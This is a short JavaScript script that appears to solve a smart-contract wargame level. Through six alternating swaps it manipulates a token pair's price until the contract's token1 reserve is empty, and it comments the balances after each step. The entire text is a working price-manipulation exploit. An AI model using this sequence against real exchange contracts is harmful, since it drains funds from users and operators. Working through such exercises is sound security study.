/**
 * Attacking by price manipulation
 */

//STEP 0
await contract.approve(await contract.address, 1000)

//STEP 1
await contract.swap( await contract.token1(), await contract.token2(), 10)
/**
 * PLAYER STATE 
 *    token 1: 0
 *    token 2: 20
 * CONTRACT STATE
 *    token 1: 110
 *    token 2: 90
 */

//STEP 2
await contract.swap( await contract.token2(), await contract.token1(), 20)
/**
 * PLAYER STATE 
 *    token 1: 24
 *    token 2: 0
 * CONTRACT STATE
 *    token 1: 86
 *    token 2: 110
 */

//STEP 3
await contract.swap( await contract.token1(), await contract.token2(), 24)
/**
 * PLAYER STATE 
 *    token 1: 0
 *    token 2: 30
 * CONTRACT STATE
 *    token 1: 110
 *    token 2: 80
 */

//STEP 4
await contract.swap( await contract.token2(), await contract.token1(), 30)
/**
 * PLAYER STATE 
 *    token 1: 41
 *    token 2: 0
 * CONTRACT STATE
 *    token 1: 69
 *    token 2: 110
 */

//STEP 5
await contract.swap( await contract.token1(), await contract.token2(), 41)
/**
 * PLAYER STATE 
 *    token 1: 0
 *    token 2: 65
 * CONTRACT STATE
 *    token 1: 110
 *    token 2: 45
 */

//STEP 6
await contract.swap( await contract.token2(), await contract.token1(), 45)
/**
 * PLAYER STATE 
 *    token 1: 110
 *    token 2: 25
 * CONTRACT STATE
 *    token 1: 0
 *    token 2: 90
 */
